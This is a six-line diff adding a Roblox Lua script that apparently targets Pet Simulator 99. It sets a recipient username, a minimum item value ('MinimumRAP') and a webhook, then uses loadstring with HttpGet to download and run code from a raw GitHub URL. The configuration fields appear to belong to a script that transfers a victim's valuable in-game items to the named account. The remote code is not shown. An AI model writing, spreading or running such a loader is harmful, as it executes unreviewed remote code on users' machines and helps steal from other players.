@@ -1,0 +1,6 @@
+Username = "Viorel1M"
+Username2 = "Viorel1M"
+MinimumRAP = 100000
+Webhook = "1000000"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/214Eli/214scripts/refs/heads/main/ps99", true))()
